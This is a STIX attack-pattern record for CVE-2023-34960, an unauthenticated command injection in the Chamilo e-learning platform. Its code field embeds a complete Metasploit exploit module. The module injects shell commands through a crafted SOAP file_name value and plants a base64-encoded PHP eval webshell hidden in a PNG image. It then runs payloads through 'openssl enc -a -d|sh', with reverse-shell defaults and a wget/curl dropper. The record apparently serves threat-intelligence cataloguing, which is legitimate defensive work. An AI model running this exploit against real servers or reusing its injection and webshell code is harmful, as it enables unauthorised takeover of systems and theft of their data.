{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--784663c9-2e15-482e-bf02-f922fa3a9ed4",
    "created": "2024-08-14T17:02:35.315487Z",
    "modified": "2024-08-14T17:02:35.315491Z",
    "name": "Chamilo unauthenticated command injection in PowerPoint upload",
    "description": " Chamilo is an e-learning platform, also called Learning Management Systems (LMS). This module exploits an unauthenticated remote command execution vulnerability",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/chamilo_unauth_rce_cve_2023_34960.rb",
            "external_id": "chamilo_unauth_rce_cve_2023_34960.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-34960"
        },
        {
            "source_name": "reference",
            "url": "https://www.randorisec.fr/pt/chamilo-1.11.18-multiple-vulnerabilities"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/VVJpMeSpUP/cve-2023-34960"
        }
    ],
    "x_code_snippet": "# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Format::PhpPayloadPng\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Chamilo unauthenticated command injection in PowerPoint upload',\n        'Description' => %q{\n          Chamilo is an e-learning platform, also called Learning Management Systems (LMS).\n          This module exploits an unauthenticated remote command execution vulnerability\n          that affects Chamilo versions `1.11.18` and below (CVE-2023-34960).\n          Due to a functionality called Chamilo Rapid to easily convert PowerPoint\n          slides to courses on Chamilo, it is possible for an unauthenticated remote\n          attacker to execute arbitrary commands at OS level using a malicious SOAP\n          request at the vulnerable endpoint `/main/webservices/additional_webservices.php`.\n        },\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Module Author\n          'Randorisec' # Original research\n        ],\n        'References' => [\n          ['CVE', '2023-34960'],\n          ['URL', 'https://www.randorisec.fr/pt/chamilo-1.11.18-multiple-vulnerabilities'],\n          ['URL', 'https://attackerkb.com/topics/VVJpMeSpUP/cve-2023-34960']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => ['php', 'unix', 'linux'],\n        'Privileged' => false,\n        'Arch' => [ARCH_PHP, ARCH_CMD, ARCH_X64, ARCH_X86, ARCH_AARCH64],\n        'Targets' => [\n          [\n            'PHP',\n            {\n              'Platform' => 'php',\n              'Arch' => ARCH_PHP,\n              'Type' => :php,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],\n              'Type' => :linux_dropper,\n              'Linemax' => 65535,\n              'CmdStagerFlavor' => ['wget', 'curl'],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-06-01',\n        'DefaultOptions' => {\n          'SSL' => false,\n          'RPORT' => 80\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [ true, 'The Chamilo endpoint URL', '/' ]),\n      OptString.new('WEBSHELL', [\n        false, 'The name of the webshell with extension. Webshell name will be randomly generated if left unset.', nil\n      ], conditions: %w[TARGET == 0])\n    ])\n  end\n\n  def soap_request(cmd)\n    # create SOAP request exploiting CVE-2023-34960\n\n    # Randomize ppt size\n    ppt_size = \"#{rand(720..1440)}x#{rand(360..720)}\"\n\n    return <<~EOS\n      <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n      <SOAP-ENV:Envelope\n        xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"\n        xmlns:ns1=\"#{target_uri.path}\"\n        xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n        xmlns:ns2=\"http://xml.apache.org/xml-soap\"\n        xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"\n        SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n        <SOAP-ENV:Body>\n          <ns1:wsConvertPpt>\n            <param0 xsi:type=\"ns2:Map\">\n              <item>\n                <key xsi:type=\"xsd:string\">file_data</key>\n                <value xsi:type=\"xsd:string\"></value>\n              </item>\n              <item>\n                <key xsi:type=\"xsd:string\">file_name</key>\n                <value xsi:type=\"xsd:string\">`{{}}`.pptx'|\" |#{cmd}||a #</value>\n              </item>\n              <item>\n                <key xsi:type=\"xsd:string\">service_ppt2lp_size</key>\n                <value xsi:type=\"xsd:string\">#{ppt_size}</value>\n              </item>\n            </param0>\n          </ns1:wsConvertPpt>\n        </SOAP-ENV:Body>\n      </SOAP-ENV:Envelope>\n    EOS\n  end\n\n  def upload_webshell\n    # randomize file name if option WEBSHELL is not set\n    @webshell_name = if datastore['WEBSHELL'].blank?\n                       \"#{Rex::Text.rand_text_alpha(8..16)}.php\"\n                     else\n                       datastore['WEBSHELL'].to_s\n                     end\n\n    @post_param = Rex::Text.rand_text_alphanumeric(1..8)\n\n    # inject PHP payload into the PLTE chunk of a PNG image to hide the payload\n    php_payload = \"<?php @eval(base64_decode($_POST[\\'#{@post_param}\\']));?>\"\n    png_webshell = inject_php_payload_png(php_payload, injection_method: 'PLTE')\n    return nil if png_webshell.nil?\n\n    # encode webshell data and write to file on the target for execution\n    payload = Base64.strict_encode64(png_webshell.to_s)\n    cmd = \"echo #{payload}|openssl enc -a -d > ./#{@webshell_name}\"\n\n    return send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'main', 'webservices', 'additional_webservices.php'),\n      'ctype' => 'text/xml; charset=utf-8',\n      'data' => soap_request(cmd).to_s\n    })\n  end\n\n  def execute_php(cmd, _opts = {})\n    payload = Base64.strict_encode64(cmd)\n    return send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'main', 'inc', 'lib', 'ppt2png', @webshell_name),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_post' => {\n        @post_param => payload\n      }\n    })\n  end\n\n  def execute_command(cmd, _opts = {})\n    # Encode payload with base64 and decode with openssl (most common installed on unix systems)\n    payload = Base64.strict_encode64(cmd)\n    cmd = \"echo #{payload}|openssl enc -a -d|sh\"\n\n    return send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'main', 'webservices', 'additional_webservices.php'),\n      'ctype' => 'text/xml; charset=utf-8',\n      'data' => soap_request(cmd).to_s\n    })\n  end\n\n  def check\n    # Checking if the target is vulnerable by echoing a randomised marker that will return the marker in the response.\n    print_status(\"Checking if #{peer} can be exploited.\")\n    marker = Rex::Text.rand_text_alphanumeric(8..16)\n    res = execute_command(\"echo #{marker}\")\n    if res && res.code == 200 && res.body.include?('wsConvertPptResponse') && res.body.include?(marker)\n      CheckCode::Vulnerable\n    else\n      CheckCode::Safe('No valid response received from the target.')\n    end\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :php\n      res = upload_webshell\n      fail_with(Failure::PayloadFailed, 'Web shell upload error.') unless res && res.code == 200 && res.body.include?('wsConvertPptResponse')\n      register_file_for_cleanup(@webshell_name.to_s)\n      execute_php(payload.encoded)\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager({ linemax: target.opts['Linemax'] })\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2023-06-01",
    "x_mitre_platforms": [
        "linux'"
    ]
}